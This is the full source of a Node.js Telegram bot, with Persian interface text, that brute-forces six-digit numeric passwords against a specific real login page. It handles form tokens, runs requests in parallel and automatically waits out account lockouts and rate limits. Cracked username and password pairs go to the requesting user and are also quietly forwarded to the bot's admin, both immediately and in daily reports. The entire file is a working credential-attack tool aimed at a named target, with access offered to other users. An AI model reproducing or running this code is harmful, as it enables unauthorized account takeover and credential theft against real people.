require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const cheerio = require("cheerio");
const { wrapper } = require("axios-cookiejar-support");
const { CookieJar } = require("tough-cookie");

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const LOGIN_URL = "https://haftometir.modabberonline.com/Login.aspx?ReturnUrl=%2f&AspxAutoDetectCookieSupport=1";

const START = 0;
const END = 999999;
const CONCURRENT_REQUESTS = 10;
const BATCH_DELAY = 100;
const LOCK_RETRY_DELAY = 5 * 60 * 1000;
const DAILY_REPORT_HOUR = 0;

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const runningTasks = new Map();

let publicAccessEnabled = false;
const authorizedUsers = new Set();
const usedUsers = new Set();

let dailyLog = {
  date: new Date().toLocaleDateString("fa-IR"),
  accessRequests: [],
  newUsers: [],
  successfulLogins: [],
  completedTasks: [],
  receivedMessages: [],
  addedUsers: [],
  revokedUsers: [],
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function logReceivedMessage(msg) {
  const logEntry = {
    time: new Date().toLocaleTimeString("fa-IR"),
    userId: msg.chat.id,
    username: msg.from.username || "بدون یوزرنیم",
    firstName: msg.from.first_name || "Unknown",
    message: msg.text || "پیام غیرمتنی",
  };
  dailyLog.receivedMessages.push(logEntry);
}

async function sendDailyReport() {
  let report = `📊 *گزارش روزانه*\n`;
  report += `📅 تاریخ: ${dailyLog.date}\n`;
  report += `⏰ زمان: ${new Date().toLocaleTimeString("fa-IR")}\n\n`;

  if (dailyLog.accessRequests.length > 0) {
    report += `🔔 *درخواست‌های دسترسی:* (${dailyLog.accessRequests.length})\n`;
    dailyLog.accessRequests.forEach((req, index) => {
      if (index < 10) {
        report += `   ${index + 1}. \`${req.userId}\` - ${req.name} - ${
          req.time
        }\n`;
      }
    });
    if (dailyLog.accessRequests.length > 10) {
      report += `   ... و ${dailyLog.accessRequests.length - 10} مورد دیگر\n`;
    }
    report += "\n";
  }

  if (dailyLog.newUsers.length > 0) {
    report += `✅ *کاربران جدید استفاده کننده:* (${dailyLog.newUsers.length})\n`;
    dailyLog.newUsers.forEach((user, index) => {
      if (index < 10) {
        report += `   ${index + 1}. \`${user.userId}\` - ${user.username} - ${
          user.time
        }\n`;
      }
    });
    if (dailyLog.newUsers.length > 10) {
      report += `   ... و ${dailyLog.newUsers.length - 10} مورد دیگر\n`;
    }
    report += "\n";
  }

  if (dailyLog.successfulLogins.length > 0) {
    report += `🎉 *پسوردهای پیدا شده:* (${dailyLog.successfulLogins.length})\n`;
    dailyLog.successfulLogins.forEach((login, index) => {
      report += `   ${index + 1}. Username: \`${login.username}\` - Pass: \`${
        login.password
      }\` - ${login.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.completedTasks.length > 0) {
    report += `✅ *تست‌های تمام شده:* (${dailyLog.completedTasks.length})\n`;
    dailyLog.completedTasks.forEach((task, index) => {
      if (index < 10) {
        report += `   ${index + 1}. \`${task.username}\` - موفق: ${
          task.success
        } - ${task.time}\n`;
      }
    });
    if (dailyLog.completedTasks.length > 10) {
      report += `   ... و ${dailyLog.completedTasks.length - 10} مورد دیگر\n`;
    }
    report += "\n";
  }

  if (dailyLog.addedUsers.length > 0) {
    report += `➕ *کاربران مجاز شده:* (${dailyLog.addedUsers.length})\n`;
    dailyLog.addedUsers.forEach((user, index) => {
      report += `   ${index + 1}. \`${user.userId}\` - ${user.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.revokedUsers.length > 0) {
    report += `➖ *کاربران لغو شده:* (${dailyLog.revokedUsers.length})\n`;
    dailyLog.revokedUsers.forEach((user, index) => {
      report += `   ${index + 1}. \`${user.userId}\` - ${user.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.receivedMessages.length > 0) {
    report += `💬 *پیام‌های دریافتی:* (${dailyLog.receivedMessages.length})\n`;
    const uniqueUsers = new Set(dailyLog.receivedMessages.map((m) => m.userId));
    report += `👥 تعداد کاربران: ${uniqueUsers.size}\n`;

    const lastMessages = dailyLog.receivedMessages.slice(-5);
    lastMessages.forEach((msg, index) => {
      const text =
        msg.message.length > 30
          ? msg.message.substring(0, 30) + "..."
          : msg.message;
      report += `   ${index + 1}. \`${msg.userId}\` - ${text} - ${msg.time}\n`;
    });
    report += "\n";
  }

  if (
    dailyLog.accessRequests.length === 0 &&
    dailyLog.newUsers.length === 0 &&
    dailyLog.successfulLogins.length === 0 &&
    dailyLog.completedTasks.length === 0 &&
    dailyLog.receivedMessages.length === 0
  ) {
    report += `💤 *امروز هیچ فعالیتی نبود*\n`;
  }

  await sendTelegram(report);

  dailyLog = {
    date: new Date().toLocaleDateString("fa-IR"),
    accessRequests: [],
    newUsers: [],
    successfulLogins: [],
    completedTasks: [],
    receivedMessages: [],
    addedUsers: [],
    revokedUsers: [],
  };
}

function setupDailyReport() {
  const checkTime = () => {
    const now = new Date();
    if (now.getHours() === DAILY_REPORT_HOUR && now.getMinutes() === 0) {
      sendDailyReport();
    }
  };

  setInterval(checkTime, 60 * 1000);
}

async function sendTelegram(message) {
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error sending telegram:", error.message);
  }
}

function hasAccess(chatId) {
  const chatIdStr = chatId.toString();

  if (chatIdStr === ADMIN_CHAT_ID) {
    return { allowed: true, isAdmin: true };
  }

  if (authorizedUsers.has(chatIdStr)) {
    if (usedUsers.has(chatIdStr)) {
      return { allowed: false, isAdmin: false, reason: "already_used" };
    }
    return { allowed: true, isAdmin: false, isAuthorized: true };
  }

  if (publicAccessEnabled) {
    if (usedUsers.has(chatIdStr)) {
      return { allowed: false, isAdmin: false, reason: "already_used" };
    }
    return { allowed: true, isAdmin: false, isPublic: true };
  }

  return { allowed: false, isAdmin: false, reason: "no_access" };
}

async function tryLogin(username, password) {
  const jar = new CookieJar();
  const client = wrapper(axios.create({ jar, timeout: 10000 }));

  try {
    const loginPageResponse = await client.get(LOGIN_URL);
    const $ = cheerio.load(loginPageResponse.data);

    const formData = new URLSearchParams();
    $('input[type="hidden"]').each((i, elem) => {
      const name = $(elem).attr("name");
      const value = $(elem).attr("value");
      if (name && value) {
        formData.append(name, value);
      }
    });

    formData.append("txtUserName", username);
    formData.append("txtPassword", password);
    formData.append("LoginButton", "ورود به سیستم");

    const loginResponse = await client.post(LOGIN_URL, formData, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: LOGIN_URL,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      maxRedirects: 0,
      validateStatus: (status) => status >= 200 && status < 400,
    });

    const $response = cheerio.load(loginResponse.data);
    const errorMessage = $response("#lblMessage").text().trim();
    const loginError = $response(".error-message").text().trim();
    const validationError = $response(".validation-summary-errors")
      .text()
      .trim();
    const lockedMessage = $response("#lblErrorForm").text().trim();

    if (
      lockedMessage &&
      (lockedMessage.includes("قفل") || lockedMessage.includes("locked"))
    ) {
      return {
        success: false,
        message: `🔒 LOCKED - ${lockedMessage}`,
        password,
        isLocked: true,
      };
    }

    if (errorMessage || loginError || validationError) {
      return {
        success: false,
        message: errorMessage || loginError || validationError || "Invalid",
        password,
      };
    }

    if (loginResponse.status === 302 || loginResponse.status === 301) {
      return { success: true, message: "✅ Redirected", password };
    }

    if ($response('input[name="txtUserName"]').length > 0) {
      return { success: false, message: "Invalid", password };
    }

    return { success: true, message: "✅ Logged in", password };
  } catch (error) {
    if (error.response && error.response.status === 302) {
      return { success: true, message: "✅ Redirect", password };
    }

    if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
      return { success: false, message: "⏱️ TIMEOUT", password };
    }

    if (error.response && error.response.status === 429) {
      return {
        success: false,
        message: "🔒 Rate limited",
        password,
        isLocked: true,
      };
    }

    return { success: false, message: `❌ ${error.message}`, password };
  }
}

async function checkIfStillLocked(username) {
  const testPassword = "999999";
  const result = await tryLogin(username, testPassword);
  return result.isLocked || false;
}

async function bruteForceUsername(username, chatId) {
  if (runningTasks.has(username) && runningTasks.get(username).isRunning) {
    await bot.sendMessage(
      chatId,
      `⚠️ \`${username}\` در حال حاضر در حال تست است!`,
      { parse_mode: "Markdown" }
    );
    return;
  }

  const task = {
    isRunning: true,
    username: username,
    chatId: chatId,
    successCount: 0,
    failedCount: 0,
    processedCount: 0,
    startTime: Date.now(),
    lastUpdate: Date.now(),
  };

  runningTasks.set(username, task);

  const startMessage =
    `🚀 *شروع تست*\n\n` +
    `👤 Username: \`${username}\`\n` +
    `🔑 Range: ${START.toString().padStart(6, "0")} - ${END.toString().padStart(
      6,
      "0"
    )}\n` +
    `⚡ Concurrent: ${CONCURRENT_REQUESTS}`;

  await bot.sendMessage(chatId, startMessage, { parse_mode: "Markdown" });

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    await sendTelegram(
      `🔔 *کاربر جدید تست شروع کرد*\n\n` +
        `👤 Username: \`${username}\`\n` +
        `🆔 User ID: \`${chatId}\``
    );
  }

  for (let i = START; i <= END; i += CONCURRENT_REQUESTS) {
    if (!runningTasks.has(username) || !runningTasks.get(username).isRunning) {
      await bot.sendMessage(
        chatId,
        `🛑 *تست متوقف شد*\n\n👤 Username: \`${username}\``,
        { parse_mode: "Markdown" }
      );
      runningTasks.delete(username);
      return;
    }

    const batch = [];

    for (let j = 0; j < CONCURRENT_REQUESTS && i + j <= END; j++) {
      const password = (i + j).toString().padStart(6, "0");
      batch.push(tryLogin(username, password));
    }

    const results = await Promise.all(batch);
    let batchHasLock = false;

    for (const result of results) {
      task.processedCount++;

      if (result.isLocked) {
        batchHasLock = true;
        const lockMessage =
          `🔒 *قفل شد!*\n\n` +
          `👤 Username: \`${username}\`\n` +
          `🔑 Password: \`${result.password}\`\n` +
          `⏰ صبر ${LOCK_RETRY_DELAY / 1000 / 60} دقیقه...`;

        await bot.sendMessage(chatId, lockMessage, { parse_mode: "Markdown" });

        await sleep(LOCK_RETRY_DELAY);

        let stillLocked = await checkIfStillLocked(username);
        while (stillLocked && runningTasks.get(username)?.isRunning) {
          await bot.sendMessage(
            chatId,
            `⏰ هنوز قفله: \`${username}\`\n` +
              `صبر ${LOCK_RETRY_DELAY / 1000 / 60} دقیقه دیگه...`,
            { parse_mode: "Markdown" }
          );
          await sleep(LOCK_RETRY_DELAY);
          stillLocked = await checkIfStillLocked(username);
        }

        if (runningTasks.get(username)?.isRunning) {
          await bot.sendMessage(
            chatId,
            `✅ قفل باز شد: \`${username}\` - ادامه...`,
            { parse_mode: "Markdown" }
          );
          i -= CONCURRENT_REQUESTS;
        }
        break;
      }

      if (result.success) {
        task.successCount++;
        const successMessage =
          `🎉 *پسورد پیدا شد!*\n\n` +
          `👤 Username: \`${username}\`\n` +
          `🔑 Password: \`${result.password}\`\n` +
          `✅ ${result.message}`;

        await bot.sendMessage(chatId, successMessage, {
          parse_mode: "Markdown",
        });

        dailyLog.successfulLogins.push({
          username: username,
          password: result.password,
          userId: chatId,
          time: new Date().toLocaleTimeString("fa-IR"),
        });

        if (chatId.toString() !== ADMIN_CHAT_ID) {
          await sendTelegram(successMessage + `\n\n🆔 User ID: \`${chatId}\``);
        }
      } else {
        task.failedCount++;
      }
    }

    if (Date.now() - task.lastUpdate > 30000 && !batchHasLock) {
      task.lastUpdate = Date.now();
      const elapsed = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
      const speed = (
        (task.processedCount / (Date.now() - task.startTime)) *
        1000
      ).toFixed(2);
      const progress = (
        (task.processedCount / (END - START + 1)) *
        100
      ).toFixed(2);

      await bot.sendMessage(
        chatId,
        `📊 *پیشرفت*\n\n` +
          `👤 Username: \`${username}\`\n` +
          `🔢 پیشرفت: ${progress}%\n` +
          `📝 تست شده: ${task.processedCount}\n` +
          `✅ موفق: ${task.successCount}\n` +
          `❌ ناموفق: ${task.failedCount}\n` +
          `⚡ سرعت: ${speed} req/s\n` +
          `⏱️ زمان: ${elapsed} دقیقه`,
        { parse_mode: "Markdown" }
      );
    }

    if (!batchHasLock && i + CONCURRENT_REQUESTS <= END) {
      await sleep(BATCH_DELAY);
    }
  }

  const totalTime = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);

  const finalMessage =
    `✅ *تست تمام شد*\n\n` +
    `👤 Username: \`${username}\`\n` +
    `📊 کل: ${task.processedCount}\n` +
    `✅ موفق: ${task.successCount}\n` +
    `❌ ناموفق: ${task.failedCount}\n` +
    `⏱️ زمان: ${totalTime} دقیقه`;

  await bot.sendMessage(chatId, finalMessage, { parse_mode: "Markdown" });

  dailyLog.completedTasks.push({
    username: username,
    success: task.successCount,
    userId: chatId,
    time: new Date().toLocaleTimeString("fa-IR"),
  });

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    await sendTelegram(finalMessage + `\n\n🆔 User ID: \`${chatId}\``);
  }

  runningTasks.delete(username);
}

bot.on("message", (msg) => {
  logReceivedMessage(msg);
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  if (!access.allowed) {
    let errorMsg = "⛔ شما دسترسی به این ربات ندارید!\n\n";

    if (access.reason === "already_used") {
      errorMsg += "💡 شما قبلاً از این ربات استفاده کرده‌اید.\n";
      errorMsg += "هر کاربر فقط یک بار می‌تواند استفاده کند.";
    } else if (access.reason === "no_access") {
      errorMsg += "💡 لطفاً از ادمین بخواهید به شما دسترسی بدهد.\n";
      errorMsg += `🆔 Your ID: \`${chatId}\``;
    }

    bot.sendMessage(chatId, errorMsg, { parse_mode: "Markdown" });

    if (access.reason === "no_access") {
      dailyLog.accessRequests.push({
        userId: chatId,
        name: msg.from.first_name || "Unknown",
        username: msg.from.username || "بدون یوزرنیم",
        time: new Date().toLocaleTimeString("fa-IR"),
      });

      await sendTelegram(
        `🔔 *درخواست دسترسی جدید*\n\n` +
          `🆔 User ID: \`${chatId}\`\n` +
          `👤 Name: ${msg.from.first_name || "Unknown"}\n` +
          `📝 Username: ${
            msg.from.username ? "@" + msg.from.username : "ندارد"
          }\n\n` +
          `💡 برای دادن دسترسی:\n\`/access ${chatId}\``
      );
    }

    return;
  }

  const welcomeMessage = `
🤖 *ربات Brute Force Test*

📋 *دستورات اصلی:*

/add \`username\` - اضافه کردن و شروع تست
/stop \`username\` - توقف یک تست خاص
/list - لیست تست‌های در حال اجرا
/status - وضعیت کلی
/help - راهنما

*مثال:*
\`/add 0123456789\`
\`/stop 0123456789\`

${
  access.isAdmin
    ? `\n🔧 *دستورات ادمین:*\n/allaccess - فعال/غیرفعال دسترسی عمومی\n/access <user_id> - دادن دسترسی به کاربر\n/revoke <user_id> - حذف دسترسی کاربر\n/users - لیست کاربران\n/todaylog - گزارش امروز\n/resetall - ریست کامل سیستم`
    : `\n⚠️ *توجه:* شما فقط یک بار می‌توانید از ربات استفاده کنید!`
}
  `;

  bot.sendMessage(chatId, welcomeMessage, { parse_mode: "Markdown" });
});

bot.onText(/\/add (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  if (!access.allowed) {
    let errorMsg = "⛔ شما دسترسی به این ربات ندارید!\n\n";

    if (access.reason === "already_used") {
      errorMsg += "💡 شما قبلاً از این ربات استفاده کرده‌اید.";
    } else if (access.reason === "no_access") {
      errorMsg += `💡 لطفاً از ادمین دسترسی بگیرید.\n🆔 Your ID: \`${chatId}\``;
    }

    bot.sendMessage(chatId, errorMsg, { parse_mode: "Markdown" });
    return;
  }

  const username = match[1].trim();

  if (!username) {
    bot.sendMessage(
      chatId,
      "❌ لطفاً username را وارد کنید!\n\nمثال: `/add 0123456789`",
      {
        parse_mode: "Markdown",
      }
    );
    return;
  }

  if (!access.isAdmin) {
    usedUsers.add(chatId.toString());

    dailyLog.newUsers.push({
      userId: chatId,
      username: msg.from.username || "بدون یوزرنیم",
      targetUsername: username,
      time: new Date().toLocaleTimeString("fa-IR"),
    });

    bot.sendMessage(
      chatId,
      `✅ شروع تست برای \`${username}\`...\n\n⚠️ شما دیگر نمی‌توانید از ربات استفاده کنید.`,
      {
        parse_mode: "Markdown",
      }
    );
  } else {
    bot.sendMessage(chatId, `✅ شروع تست برای \`${username}\`...`, {
      parse_mode: "Markdown",
    });
  }

  bruteForceUsername(username, chatId).catch((err) => {
    bot.sendMessage(chatId, `❌ خطا در \`${username}\`: ${err.message}`, {
      parse_mode: "Markdown",
    });
  });
});

bot.onText(/\/stop (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);
  const username = match[1].trim();

  if (!username) {
    bot.sendMessage(
      chatId,
      "❌ لطفاً username را وارد کنید!\n\nمثال: `/stop 0123456789`",
      {
        parse_mode: "Markdown",
      }
    );
    return;
  }

  if (!runningTasks.has(username)) {
    bot.sendMessage(chatId, `⚠️ \`${username}\` در حال اجرا نیست!`, {
      parse_mode: "Markdown",
    });
    return;
  }

  const task = runningTasks.get(username);

  if (
    !access.isAdmin &&
    task.chatId &&
    task.chatId.toString() !== chatId.toString()
  ) {
    bot.sendMessage(chatId, `⛔ شما نمی‌توانید تست دیگران را متوقف کنید!`);
    return;
  }

  task.isRunning = false;

  bot.sendMessage(chatId, `🛑 در حال توقف \`${username}\`...`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/\/list/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  if (runningTasks.size === 0) {
    bot.sendMessage(chatId, "💤 هیچ تستی در حال اجرا نیست.");
    return;
  }

  let message = `📋 *تست‌های در حال اجرا:* (${runningTasks.size} تا)\n\n`;
  let hasAnyTask = false;

  runningTasks.forEach((task, username) => {
    const elapsed = ((Date.now() - task.startTime) / 1000 / 60).toFixed(2);
    const progress = ((task.processedCount / (END - START + 1)) * 100).toFixed(
      1
    );

    if (
      access.isAdmin ||
      (task.chatId && task.chatId.toString() === chatId.toString())
    ) {
      hasAnyTask = true;
      message += `👤 \`${username}\`\n`;
      message += `   📊 پیشرفت: ${progress}%\n`;
      message += `   ✅ موفق: ${task.successCount}\n`;
      message += `   ⏱️ زمان: ${elapsed}m\n`;
      if (access.isAdmin && task.chatId) {
        message += `   🆔 User: \`${task.chatId}\`\n`;
      }
      message += `\n`;
    }
  });

  if (!hasAnyTask) {
    bot.sendMessage(chatId, "💤 شما تستی در حال اجرا ندارید.");
    return;
  }

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  const totalRunning = runningTasks.size;
  let totalSuccess = 0;
  let totalProcessed = 0;
  let myTasks = 0;

  runningTasks.forEach((task) => {
    totalSuccess += task.successCount;
    totalProcessed += task.processedCount;

    if (task.chatId && task.chatId.toString() === chatId.toString()) {
      myTasks++;
    }
  });

  const message = `
📊 *وضعیت کلی ربات*

⚡ تست‌های فعال: ${totalRunning}
✅ کل موفق: ${totalSuccess}
🔢 کل پردازش شده: ${totalProcessed}
${!access.isAdmin ? `\n👤 تست‌های شما: ${myTasks}` : ""}
${
  access.isAdmin
    ? `\n\n🔓 دسترسی عمومی: ${
        publicAccessEnabled ? "✅ فعال" : "❌ غیرفعال"
      }\n👥 کاربران مجاز: ${authorizedUsers.size}\n📝 کاربران استفاده کننده: ${
        usedUsers.size
      }\n\n📊 آمار امروز:\n   🔔 درخواست‌ها: ${
        dailyLog.accessRequests.length
      }\n   ✅ کاربران جدید: ${
        dailyLog.newUsers.length
      }\n   🎉 پسوردهای پیدا شده: ${
        dailyLog.successfulLogins.length
      }\n   💬 پیام‌ها: ${dailyLog.receivedMessages.length}`
    : ""
}

💡 برای جزئیات از /list استفاده کنید
  `;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/todaylog/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
    return;
  }

  let report = `📊 *گزارش امروز*\n`;
  report += `📅 تاریخ: ${dailyLog.date}\n`;
  report += `⏰ زمان: ${new Date().toLocaleTimeString("fa-IR")}\n\n`;

  report += `📈 *خلاصه:*\n`;
  report += `🔔 درخواست‌ها: ${dailyLog.accessRequests.length}\n`;
  report += `✅ کاربران جدید: ${dailyLog.newUsers.length}\n`;
  report += `🎉 پسوردها: ${dailyLog.successfulLogins.length}\n`;
  report += `✅ تست‌های تمام شده: ${dailyLog.completedTasks.length}\n`;
  report += `➕ کاربران مجاز شده: ${dailyLog.addedUsers.length}\n`;
  report += `➖ کاربران لغو شده: ${dailyLog.revokedUsers.length}\n`;
  report += `💬 پیام‌ها: ${dailyLog.receivedMessages.length}\n\n`;

  if (dailyLog.accessRequests.length > 0) {
    report += `🔔 *درخواست‌های دسترسی:*\n`;
    dailyLog.accessRequests.slice(-10).forEach((req, index) => {
      report += `   ${index + 1}. \`${req.userId}\` - ${req.name} - ${
        req.time
      }\n`;
    });
    report += "\n";
  }

  if (dailyLog.newUsers.length > 0) {
    report += `✅ *کاربران جدید:*\n`;
    dailyLog.newUsers.forEach((user, index) => {
      report += `   ${index + 1}. \`${user.userId}\` - ${
        user.targetUsername
      } - ${user.time}\n`;
    });
    report += "\n";
  }

  if (dailyLog.successfulLogins.length > 0) {
    report += `🎉 *پسوردهای پیدا شده:*\n`;
    dailyLog.successfulLogins.forEach((login, index) => {
      report += `   ${index + 1}. \`${login.username}\` - \`${
        login.password
      }\` - ${login.time}\n`;
    });
    report += "\n";
  }

  report += `💡 گزارش کامل هر شب ساعت ${DAILY_REPORT_HOUR}:00 ارسال می‌شود.`;

  bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
});

bot.onText(/\/allaccess/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
    return;
  }

  publicAccessEnabled = !publicAccessEnabled;

  const status = publicAccessEnabled ? "✅ فعال" : "❌ غیرفعال";
  const emoji = publicAccessEnabled ? "🔓" : "🔒";

  bot.sendMessage(
    chatId,
    `${emoji} *دسترسی عمومی ${status} شد!*\n\n` +
      `${
        publicAccessEnabled
          ? "✅ اکنون همه می‌توانند از ربات استفاده کنند (هر نفر یک بار)"
          : "❌ فقط کاربران مجاز می‌توانند از ربات استفاده کنند"
      }\n\n` +
      `👥 کاربران مجاز: ${authorizedUsers.size}\n` +
      `📝 کاربران استفاده کننده: ${usedUsers.size}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/access (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
    return;
  }

  const userId = match[1].trim();

  if (!userId) {
    bot.sendMessage(
      chatId,
      "❌ لطفاً User ID را وارد کنید!\n\nمثال: `/access 123456789`",
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (authorizedUsers.has(userId)) {
    bot.sendMessage(
      chatId,
      `⚠️ کاربر \`${userId}\` قبلاً مجاز است!\n\n` +
        `${
          usedUsers.has(userId) ? "✅ استفاده کرده" : "❌ هنوز استفاده نکرده"
        }`,
      { parse_mode: "Markdown" }
    );
    return;
  }

  authorizedUsers.add(userId);

  dailyLog.addedUsers.push({
    userId: userId,
    time: new Date().toLocaleTimeString("fa-IR"),
  });

  bot.sendMessage(
    chatId,
    `✅ *دسترسی داده شد!*\n\n` +
      `🆔 User ID: \`${userId}\`\n` +
      `👥 کل کاربران مجاز: ${authorizedUsers.size}\n\n` +
      `💡 کاربر می‌تواند یک بار از ربات استفاده کند.`,
    { parse_mode: "Markdown" }
  );

  try {
    await bot.sendMessage(
      userId,
      `🎉 *دسترسی فعال شد!*\n\n` +
        `✅ شما اکنون می‌توانید از ربات استفاده کنید.\n` +
        `⚠️ توجه: فقط یک بار می‌توانید استفاده کنید!\n\n` +
        `💡 برای شروع از دستور /start استفاده کنید.`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    bot.sendMessage(
      chatId,
      `⚠️ نتوانستم به کاربر پیام بدم. احتمالاً ربات را شروع نکرده.`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/\/revoke (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
    return;
  }

  const userId = match[1].trim();

  if (!userId) {
    bot.sendMessage(
      chatId,
      "❌ لطفاً User ID را وارد کنید!\n\nمثال: `/revoke 123456789`",
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (!authorizedUsers.has(userId)) {
    bot.sendMessage(chatId, `⚠️ کاربر \`${userId}\` در لیست مجاز نیست!`, {
      parse_mode: "Markdown",
    });
    return;
  }

  authorizedUsers.delete(userId);

  dailyLog.revokedUsers.push({
    userId: userId,
    time: new Date().toLocaleTimeString("fa-IR"),
  });

  bot.sendMessage(
    chatId,
    `✅ *دسترسی حذف شد!*\n\n` +
      `🆔 User ID: \`${userId}\`\n` +
      `👥 کل کاربران مجاز: ${authorizedUsers.size}`,
    { parse_mode: "Markdown" }
  );

  try {
    await bot.sendMessage(
      userId,
      `⛔ *دسترسی شما لغو شد!*\n\n` +
        `❌ شما دیگر نمی‌توانید از ربات استفاده کنید.`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {}
});

bot.onText(/\/users/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
    return;
  }

  let message = `👥 *لیست کاربران*\n\n`;

  message += `🔓 دسترسی عمومی: ${
    publicAccessEnabled ? "✅ فعال" : "❌ غیرفعال"
  }\n\n`;

  if (authorizedUsers.size > 0) {
    message += `✅ *کاربران مجاز:* (${authorizedUsers.size})\n`;
    authorizedUsers.forEach((userId) => {
      const used = usedUsers.has(userId) ? "✅" : "❌";
      message += `   ${used} \`${userId}\`\n`;
    });
  } else {
    message += `⚠️ هیچ کاربر مجازی وجود ندارد\n`;
  }

  message += `\n📝 *کل استفاده کننده:* ${usedUsers.size}\n`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/resetall/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ این دستور فقط برای ادمین است!");
    return;
  }

  runningTasks.forEach((task) => {
    task.isRunning = false;
  });

  const tasksCount = runningTasks.size;
  const usersCount = usedUsers.size;
  const authCount = authorizedUsers.size;

  runningTasks.clear();
  usedUsers.clear();
  authorizedUsers.clear();
  publicAccessEnabled = false;

  bot.sendMessage(
    chatId,
    `🔄 *ریست کامل انجام شد!*\n\n` +
      `✅ ${tasksCount} تست متوقف شد\n` +
      `✅ ${usersCount} کاربر استفاده کننده پاک شد\n` +
      `✅ ${authCount} کاربر مجاز پاک شد\n` +
      `✅ دسترسی عمومی غیرفعال شد\n\n` +
      `💡 سیستم آماده استفاده مجدد است\n` +
      `⚠️ لاگ‌های روزانه حفظ می‌شوند`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/help/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  const helpMessage = `
📖 *راهنمای کامل*

*1️⃣ اضافه کردن username:*
\`/add 0123456789\`
تست فوراً شروع می‌شه و همزمان با بقیه اجرا می‌شه

*2️⃣ متوقف کردن یک username:*
\`/stop 0123456789\`
فقط این یکی متوقف می‌شه، بقیه ادامه می‌دن

*3️⃣ لیست تست‌های فعال:*
\`/list\`
نشون میده چی‌ها در حال اجراست

*4️⃣ وضعیت کلی:*
\`/status\`

⚙️ *تنظیمات:*
• Password Range: ${START} - ${END}
• Concurrent: ${CONCURRENT_REQUESTS}
• Lock Retry: ${LOCK_RETRY_DELAY / 1000 / 60} دقیقه

${
  access.isAdmin
    ? `\n🔧 *دستورات ادمین:*\n\n*5️⃣ فعال/غیرفعال دسترسی عمومی:*\n\`/allaccess\` - همه می‌توانند استفاده کنند\n\n*6️⃣ دادن دسترسی به کاربر خاص:*\n\`/access <user_id>\` - مثال: \`/access 123456789\`\n\n*7️⃣ حذف دسترسی کاربر:*\n\`/revoke <user_id>\` - مثال: \`/revoke 123456789\`\n\n*8️⃣ لیست کاربران:*\n\`/users\` - نمایش کاربران مجاز و استفاده کننده\n\n*9️⃣ گزارش امروز:*\n\`/todaylog\` - نمایش آمار و لاگ امروز\n\n*🔟 ریست کامل:*\n\`/resetall\` - متوقف کردن همه تست‌ها و پاک کردن لیست‌ها\n\n📊 *گزارش‌دهی خودکار:*\n• هر روز ساعت ${DAILY_REPORT_HOUR}:00 گزارش کامل ارسال می‌شود\n• شامل: درخواست‌ها، کاربران جدید، پسوردها، پیام‌ها`
    : `\n⚠️ *محدودیت:*\nشما فقط یک بار می‌توانید از این ربات استفاده کنید!\n\n🆔 Your ID: \`${chatId}\``
}

💡 *نکات:*
✓ می‌تونی چند username رو همزمان اضافه کنی
✓ هر کدوم مستقل کار می‌کنن
✓ stop فقط اون یکیو متوقف می‌کنه
✓ وقتی پسورد پیدا شد بهت پیام می‌ده
✓ وقتی قفل شد خودکار صبر می‌کنه
  `;

  bot.sendMessage(chatId, helpMessage, { parse_mode: "Markdown" });
});

setupDailyReport();

console.log("🤖 Telegram Bot started!");
console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
console.log("✅ Ready to receive /add commands");
console.log(
  `🔓 Public Access: ${publicAccessEnabled ? "Enabled" : "Disabled"}`
);
